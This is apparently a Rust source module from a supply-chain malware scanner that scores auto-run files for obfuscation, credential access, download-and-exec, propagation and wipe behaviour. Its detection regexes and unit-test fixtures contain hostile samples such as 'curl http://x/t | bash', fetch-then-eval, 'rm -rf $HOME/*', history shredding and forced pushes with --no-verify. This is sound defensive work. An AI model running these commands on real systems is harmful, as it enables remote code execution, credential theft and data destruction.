//! Value-independent capability scoring over an auto-run [`Surface`].
//!
//! Each detector recognizes a behavior the malware *must* perform (obfuscation,
//! credential reads, network egress, process spawn, download-and-exec,
//! self-propagation, on-chain C2 resolution, trailing payload, destructive
//! wipe, fake-font). Patterns are lexical; there is no AST. [`gate`] applies a
//! conservative, surface-aware fire decision — see the design spec §5/§6/§7.

use std::sync::OnceLock;

use regex::Regex;

use crate::matchers::shannon_entropy;
use crate::surface::Surface;

#[derive(Debug, Default, Clone, PartialEq)]
pub struct CapabilityScore {
    pub obfuscation: bool,
    pub credential_access: bool,
    pub network_egress: bool,
    pub process_spawn: bool,
    pub magic_mismatch: bool,
    pub download_exec: bool,
    pub propagation: bool,
    pub on_chain_resolve: bool,
    pub trailing_code: bool,
    pub destructive_wipe: bool,
    pub evidence: Vec<String>,
}

macro_rules! lazy_re {
    ($f:ident, $pat:expr) => {
        fn $f() -> &'static Regex {
            static R: OnceLock<Regex> = OnceLock::new();
            R.get_or_init(|| Regex::new($pat).unwrap())
        }
    };
}

// --- Obfuscation ---
lazy_re!(global_dyn_re, r"(?:global|globalThis|process)\s*(?:\[|\.)\s*['\w!]+\s*\]?\s*=");
lazy_re!(
    esm_shim_re,
    r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b|createRequire\s*\(\s*import\.meta\.url"
);
lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");

fn obfuscation(content: &str) -> bool {
    if global_dyn_re().is_match(content)
        && (decoder_re().is_match(content)
            || charcode_re().is_match(content)
            || evalish_re().is_match(content))
    {
        return true;
    }
    if esm_shim_re().is_match(content) {
        return true;
    }
    if charcode_re().is_match(content) || decoder_re().is_match(content) {
        return true;
    }
    if content
        .lines()
        .any(|l| l.len() > 500 && !l.contains("data:") && !l.trim_start().starts_with("http"))
    {
        return true;
    }
    let b = content.as_bytes();
    shannon_entropy(&b[b.len().saturating_sub(512)..]) > 5.0
}

// --- CredentialAccess ---
lazy_re!(
    cred_re,
    r"\.aws/credentials|\.ssh/|\.npmrc|\.git-credentials|Object\.keys\(\s*process\.env|process\.env\.(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|security\s+find-generic-password|Login Data|logins\.json"
);
fn credential_access(content: &str, surface: Surface) -> bool {
    if cred_re().is_match(content) {
        return true;
    }
    matches!(surface, Surface::WorkflowFile) && content.contains("${{ secrets.")
}

// --- NetworkEgress ---
lazy_re!(
    net_re,
    r#"require\(\s*['"](?:https?|net|dgram|tls)['"]|from\s+['"](?:node:)?(?:https?|net|dgram|tls)['"]|\bfetch\s*\(|\baxios\b|XMLHttpRequest|\bWebSocket\b|\bcurl\b|\bwget\b|Invoke-WebRequest|\biwr\b"#
);
lazy_re!(url_re, r#"https?://[\w.-]+"#);
fn network_egress(content: &str, surface: Surface) -> bool {
    net_re().is_match(content) || (matches!(surface, Surface::ConfigFile) && url_re().is_match(content))
}

// --- ProcessSpawn ---
lazy_re!(spawn_re, r"child_process|\bspawn\s*\(|\bexecSync\s*\(|\bexec\s*\(|Bun\.spawn(?:Sync)?\s*\(");
fn process_spawn(content: &str) -> bool {
    spawn_re().is_match(content)
}

// --- MagicMismatch (only meaningful when surface == BinaryAsset) ---
lazy_re!(
    js_tokens_re,
    r"\brequire\s*\(|\beval\s*\(|\bglobal\b|fromCharCode|\bfunction\b|module\.exports"
);
fn magic_mismatch(content: &str, surface: Surface) -> bool {
    matches!(surface, Surface::BinaryAsset) && js_tokens_re().is_match(content)
}

// --- DownloadExec ---
lazy_re!(
    fetch_tok_re,
    r"\bcurl\b|\bwget\b|\bfetch\s*\(|Invoke-WebRequest|\biwr\b|certutil\s+-urlcache|powershell\s+-enc"
);
lazy_re!(
    exec_sink_re,
    r"\|\s*(?:sh|bash)\b|node\s+-e\b|node\s+-\b|chmod\s+\+x|bun\s+run\b|sh\s+-c\b|\beval\s*\("
);
fn download_exec(content: &str) -> bool {
    fetch_tok_re().is_match(content) && exec_sink_re().is_match(content)
}

// --- Propagation ---
lazy_re!(amend_re, r"commit\s+.*--amend|--amend");
lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)|-uf\b");
lazy_re!(noverify_re, r"--no-verify");
lazy_re!(
    publish_re,
    r"npm\s+publish\b|gh\s+api\s+[^\n]*repos|gh\s+repo\s+create\b|gh\s+workflow\b"
);
fn propagation(content: &str, surface: Surface) -> bool {
    let git_conj = amend_re().is_match(content)
        && forcepush_re().is_match(content)
        && noverify_re().is_match(content);
    if git_conj {
        return true;
    }
    let auto_run = matches!(
        surface,
        Surface::LifecycleScript | Surface::WorkflowFile | Surface::DerivedScript | Surface::GitHook
    );
    publish_re().is_match(content) && (auto_run || cred_re().is_match(content))
}

// --- OnChainResolve ---
lazy_re!(
    rpc_re,
    r"eth_call|eth_getTransactionByHash|/v1/accounts/|trongrid|aptoslabs|bsc-dataseed|\x22method\x22\s*:\s*\x22eth_"
);
lazy_re!(xor_re, r"charCodeAt[^;]*\^|\^[^;]*charCodeAt|fromCharCode[^;]*\^");
fn on_chain_resolve(content: &str) -> bool {
    rpc_re().is_match(content) && xor_re().is_match(content) && evalish_re().is_match(content)
}

// --- TrailingCode (ConfigFile / DerivedScript only) ---
fn trailing_code(content: &str, surface: Surface) -> bool {
    if !matches!(surface, Surface::ConfigFile | Surface::DerivedScript) {
        return false;
    }
    let marker = ["export default", "module.exports"]
        .iter()
        .filter_map(|m| content.rfind(m))
        .max();
    let tail = match marker {
        Some(i) => &content[i..],
        None => return false,
    };
    let after = tail.split_once('\n').map(|(_, rest)| rest).unwrap_or("");
    let meaningful: String = after
        .lines()
        .filter(|l| {
            let t = l.trim();
            !t.is_empty() && !t.starts_with("//") && !t.starts_with("/*") && !t.starts_with('*')
        })
        .collect::<Vec<_>>()
        .join("\n");
    meaningful.len() > 8
        && (meaningful.contains('(') || meaningful.contains('=') || meaningful.contains("require"))
}

// --- DestructiveWipe ---
lazy_re!(
    wipe_re,
    r"rm\s+-rf\s+(?:\$HOME|~|/)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q"
);
fn destructive_wipe(content: &str) -> bool {
    wipe_re().is_match(content)
}

/// The double-base64 exfil-staging blob shape: content begins `eyJ` (base64 of
/// `{"`) and contains `==`. A standalone repo-level check (not a `Surface`).
pub fn is_exfil_staging(content: &str) -> bool {
    let head: String = content.trim_start().chars().take(16).collect();
    head.starts_with("eyJ") && content.contains("==")
}

/// Score every capability for a piece of content on a given surface.
pub fn score(content: &str, surface: Surface) -> CapabilityScore {
    let mut s = CapabilityScore::default();
    let mark = |cond: bool, field: &mut bool, label: &str, ev: &mut Vec<String>| {
        if cond {
            *field = true;
            ev.push(label.to_string());
        }
    };
    mark(obfuscation(content), &mut s.obfuscation, "obfuscation", &mut s.evidence);
    mark(
        credential_access(content, surface),
        &mut s.credential_access,
        "credential-access",
        &mut s.evidence,
    );
    mark(
        network_egress(content, surface),
        &mut s.network_egress,
        "network-egress",
        &mut s.evidence,
    );
    mark(process_spawn(content), &mut s.process_spawn, "process-spawn", &mut s.evidence);
    mark(
        magic_mismatch(content, surface),
        &mut s.magic_mismatch,
        "magic-mismatch",
        &mut s.evidence,
    );
    mark(download_exec(content), &mut s.download_exec, "download-exec", &mut s.evidence);
    mark(propagation(content, surface), &mut s.propagation, "propagation", &mut s.evidence);
    mark(
        on_chain_resolve(content),
        &mut s.on_chain_resolve,
        "on-chain-resolve",
        &mut s.evidence,
    );
    mark(
        trailing_code(content, surface),
        &mut s.trailing_code,
        "trailing-code",
        &mut s.evidence,
    );
    mark(
        destructive_wipe(content),
        &mut s.destructive_wipe,
        "destructive-wipe",
        &mut s.evidence,
    );
    s
}

/// Conservative, surface-aware fire decision (design spec §7).
pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
    let behavioral = s.credential_access
        || s.network_egress
        || s.process_spawn
        || s.on_chain_resolve
        || s.download_exec;
    match surface {
        Surface::ConfigFile => {
            let prior = s.obfuscation || s.trailing_code;
            (prior && behavioral) || s.on_chain_resolve || s.download_exec
        }
        Surface::DerivedScript => {
            let prior = s.obfuscation || s.trailing_code;
            (prior && behavioral)
                || s.download_exec
                || s.propagation
                || s.destructive_wipe
                || s.on_chain_resolve
        }
        Surface::LifecycleScript => {
            s.download_exec
                || s.propagation
                || s.on_chain_resolve
                || s.obfuscation
                || (s.credential_access && s.network_egress)
                || s.destructive_wipe
        }
        Surface::WorkflowFile => {
            (s.credential_access && s.network_egress) || s.propagation || s.download_exec
        }
        // TasksJson folderOpen precondition + lone remote-fetch handling are enforced
        // in the scanner (Task 7); here download_exec/propagation carry the decision.
        Surface::TasksJson => s.download_exec || s.propagation,
        Surface::GitHook => {
            s.download_exec
                || s.propagation
                || (s.credential_access && s.network_egress)
                || s.obfuscation
        }
        Surface::PropagationScript => s.propagation || s.download_exec || s.destructive_wipe,
        Surface::BinaryAsset => s.magic_mismatch,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::surface::Surface;

    // --- core detectors (Task 4) ---
    #[test]
    fn obfuscation_global_bracket() {
        assert!(score("global['!']='8-270-2';var _$_1e42=[];", Surface::ConfigFile).obfuscation);
    }
    #[test]
    fn obfuscation_dot_and_fromcharcode() {
        assert!(
            score("global.o='5';String.fromCharCode(104,105,106,107,108);", Surface::ConfigFile)
                .obfuscation
        );
    }
    #[test]
    fn obfuscation_esm_shim() {
        assert!(score(
            "global['r']=require;const require=createRequire(import.meta.url);",
            Surface::DerivedScript
        )
        .obfuscation);
    }
    #[test]
    fn clean_config_not_obfuscated() {
        assert!(!score("export default { plugins: { tailwindcss: {} } };\n", Surface::ConfigFile)
            .obfuscation);
    }
    #[test]
    fn credential_access_detected() {
        assert!(score(
            "const t=process.env.NPM_TOKEN;fs.readFileSync('~/.aws/credentials')",
            Surface::LifecycleScript
        )
        .credential_access);
    }
    #[test]
    fn network_egress_detected() {
        assert!(score("const https=require('https');fetch('http://x')", Surface::ConfigFile)
            .network_egress);
    }
    #[test]
    fn process_spawn_detected() {
        assert!(score("child_process.spawn('node',['-e',code])", Surface::DerivedScript).process_spawn);
    }
    #[test]
    fn magic_mismatch_only_on_binary_asset() {
        assert!(score("var x=require('fs');eval(y)", Surface::BinaryAsset).magic_mismatch);
        assert!(!score("var x=require('fs');eval(y)", Surface::ConfigFile).magic_mismatch);
    }

    // --- new detectors (Task 5) ---
    #[test]
    fn download_exec_detected() {
        assert!(score("curl http://x/t | bash", Surface::TasksJson).download_exec);
        assert!(score("const r=await fetch(u);eval(await r.text())", Surface::LifecycleScript)
            .download_exec);
        assert!(!score("curl http://x -o out.txt", Surface::LifecycleScript).download_exec);
    }
    #[test]
    fn propagation_git_conjunction() {
        let sh = "git commit --amend --no-verify && git push -uf --no-verify";
        assert!(score(sh, Surface::PropagationScript).propagation);
        assert!(!score("git push origin main", Surface::PropagationScript).propagation);
    }
    #[test]
    fn propagation_publish_context_gated() {
        assert!(score("npm publish --access public", Surface::LifecycleScript).propagation);
        assert!(!score("npm publish --access public", Surface::PropagationScript).propagation);
    }
    #[test]
    fn on_chain_resolve_detected() {
        let js = "fetch('https://api.trongrid.io/v1/accounts/T../transactions').then(r=>{for(i=0;i<n;i++)o+=String.fromCharCode(b.charCodeAt(i)^k);eval(o)})";
        assert!(score(js, Surface::ConfigFile).on_chain_resolve);
    }
    #[test]
    fn trailing_code_after_module_body() {
        let cfg = "export default { plugins: {} }\n;(function(){require('https')})()";
        assert!(score(cfg, Surface::ConfigFile).trailing_code);
        assert!(!score("export default { plugins: {} }\n", Surface::ConfigFile).trailing_code);
    }
    #[test]
    fn destructive_wipe_detected() {
        assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
        assert!(score("shred -uz ~/.bash_history", Surface::GitHook).destructive_wipe);
    }
    #[test]
    fn exfil_staging_double_base64() {
        assert!(is_exfil_staging("eyJhIjoiYiJ9\n==trailing"));
        assert!(!is_exfil_staging("{\"a\":\"b\"}"));
    }

    // --- gate matrix (Task 6) ---
    fn sc(f: impl Fn(&mut CapabilityScore)) -> CapabilityScore {
        let mut s = CapabilityScore::default();
        f(&mut s);
        s
    }
    #[test]
    fn gate_config_requires_prior_and_behavior() {
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.obfuscation = true)));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.obfuscation = true;
                s.network_egress = true;
            })
        ));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.trailing_code = true;
                s.process_spawn = true;
            })
        ));
    }
    #[test]
    fn gate_lifecycle_behavior_no_obfuscation_needed() {
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
        assert!(!gate(Surface::LifecycleScript, &sc(|s| s.process_spawn = true)));
    }
    #[test]
    fn gate_propagation_script() {
        assert!(gate(Surface::PropagationScript, &sc(|s| s.propagation = true)));
        assert!(!gate(Surface::PropagationScript, &sc(|s| s.process_spawn = true)));
    }
    #[test]
    fn gate_binary_asset() {
        assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
    }
    #[test]
    fn gate_git_hook_no_bare_spawn() {
        assert!(!gate(Surface::GitHook, &sc(|s| s.process_spawn = true)));
        assert!(gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
    }
}
